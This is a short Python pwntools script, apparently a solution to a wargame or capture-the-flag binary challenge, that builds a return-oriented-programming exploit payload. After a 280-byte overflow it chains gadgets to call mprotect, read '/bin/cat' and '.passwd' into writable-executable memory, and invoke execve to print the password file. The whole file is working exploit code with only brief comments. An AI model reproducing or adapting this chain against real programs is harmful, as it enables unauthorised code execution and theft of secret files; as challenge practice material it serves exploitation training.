from pwn import *

# target RWX memory address
ch34 	= 0x400000
passwd	= 0x40000a

# ROP gadgets
syscall = 0x400488
pop_rax = 0x44d2b4
pop_rdi = 0x4016d3
pop2ret = 0x437229     # pop rdx; pop rsi; ret


# functions()
mprotect = 0x434e10
read = 0x4342a0

# mprotect
payload = ""
payload += "A" * 280
payload += p64(pop_rdi)
payload += p64(ch34)
payload += p64(pop2ret)
payload += p64(0x7)
payload += p64(0x2000)
payload += p64(mprotect)

# read '/bin/cat' into rwx memory
payload += p64(pop_rdi)
payload += p64(0x1)     # rdi - stdin
payload += p64(pop2ret)
payload += p64(0x8)     # rdx - 8 bytes '/bin/cat'
payload += p64(ch34)    # rwx - memory addres
payload += p64(read)    # call read

# read '.passwd' into rwx memory
payload += p64(pop_rdi)
payload += p64(0x1)     # rdi - stdin
payload += p64(pop2ret)
payload += p64(0x8)     # rdx - 8 bytes ' .passwd'
payload += p64(passwd)    # rwx - memory addres + 20
payload += p64(read)    # call read


# execve('/bin/cat',' .passwd', 0)
payload += p64(pop_rdi)
payload += p64(ch34)        # rdi - argv[0] - '/bin/cat'
payload += p64(pop2ret)
payload += p64(0x0)
payload += p64(passwd)      # rsi - argv[1] - '.passwd'
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

print payload
